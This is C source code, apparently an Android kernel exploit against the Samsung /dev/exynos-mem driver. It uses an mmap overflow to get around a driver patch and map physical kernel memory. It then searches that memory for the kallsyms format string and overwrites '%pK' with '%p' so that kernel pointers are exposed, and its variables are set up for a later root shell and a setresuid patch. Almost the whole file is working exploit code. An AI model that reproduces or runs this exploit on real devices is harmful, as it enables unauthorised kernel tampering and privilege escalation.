#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include "util.h"

#define PAGE_OFFSET 0xC0000000
#define PHYS_OFFSET 0x40000000

int main(int argc, char **argv, char **env) {
	int fd, i, m, index, result;

	unsigned long *paddr = NULL;
    unsigned long kern_offset = (0x40000000UL + 0x1000)/4;
    unsigned long length = (0x7fefffff+1-0x40000000)/4;
    unsigned long *tmp = NULL;
    unsigned long *restore_ptr_fmt = NULL;
    unsigned long *restore_ptr_setresuid = NULL;
    unsigned long addr_sym;

	int page_size = sysconf(_SC_PAGE_SIZE);
    printf("[*] page size is %d\n", page_size);

    /* for root shell */
    char *cmd[2];
    cmd[0] = "/system/bin/sh";
    cmd[1] = NULL;

    /* /proc/kallsyms parsing */
    FILE *kallsyms = NULL;
    char line [512];
    char *ptr;
    char *str;

    bool found = false;

    /* open the door */
	fd = open("/dev/exynos-mem", O_RDWR);
	if (fd == -1) {
		printf("[!] Error opening /dev/exynos-mem\n");
		exit(1);
	}

    /* kernel reside at the start of physical memory, so take some Mb */
    // This mmap fails because the driver is patched to control the maps.
    // However, the patch is incomplete and allows an overflow to bypass the check.
    paddr = (unsigned long *)mmap(NULL, 0x50000000UL, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0xfffff000UL);
    if (paddr == MAP_FAILED) {
        printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
        exit(1);
    }
    printf("[*] mmap success at 0x%lx\n", paddr);

    // wrap around the memory
    tmp = paddr + kern_offset;

    info("Looking for magic bytes...");
    /*
     * search the format string "%pK %c %s\n" in memory
     * and replace "%pK" by "%p" to force display kernel
     * symbols pointer
     */
    for(m = 0; m < length*4; m += 4) {

        if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
            printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
            restore_ptr_fmt = tmp;
            *(unsigned long*)tmp = 0x20207025;
            found = true;
            break;
        }
        tmp++;
    }

    if (found == false) {
        printf("[!] s_show->seq_printf format string not found\n");
        exit(1);
    }

    return 0;
}